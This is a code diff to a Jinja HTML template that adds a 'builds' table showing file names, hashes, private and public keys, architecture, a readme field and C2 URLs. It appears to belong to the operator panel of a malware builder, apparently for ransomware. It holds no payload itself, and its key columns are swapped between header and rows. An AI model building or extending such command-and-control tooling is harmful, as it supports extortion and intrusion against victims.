@@ -106,7 +106,38 @@
         </div>
 
         <div class="tab-pane fade" id="builds" role="tabpanel" aria-labelledby="builds-tab">
-
+            <table class="table table-responsive table-striped mt-3" id="users-table">
+                <thead>
+                <tr>
+                    <th>ID</th>
+                    <th class="wide-col">File name</th>
+                    <th class="wide-col">Hash</th>
+                    <th class="wide-col">Private key</th>
+                    <th class="wide-col">Public key</th>
+                    <th class="wide-col">Architecture</th>
+                    <th class="wide-col">Preference</th>
+                    <th class="wide-col">Readme</th>
+                    <th class="wide-col">C2 URLs</th>
+                    <th class="wide-col">Creation</th>
+                </tr>
+                </thead>
+                <tbody>
+                {% for build in builds %}
+                    <tr>
+                        <td class="wide-col">{{ build.id }}</td>
+                        <td class="wide-col">{{ build.filename }}</td>
+                        <td class="wide-col">{{ build.file_hash }}</td>
+                        <td class="wide-col">{{ build.public_key }}</td>
+                        <td class="wide-col">{{ build.private_key }}</td>
+                        <td class="wide-col">{{ build.arch }}</td>
+                        <td class="wide-col">{{ build.preference }}</td>
+                        <td class="wide-col">{{ build.readme }}</td>
+                        <td class="wide-col">{{ build.urls }}</td>
+                        <td class="wide-col">{{ build.creation }}</td>
+                    </tr>
+                {% endfor %}
+                </tbody>
+            </table>
         </div>
     </div>
 
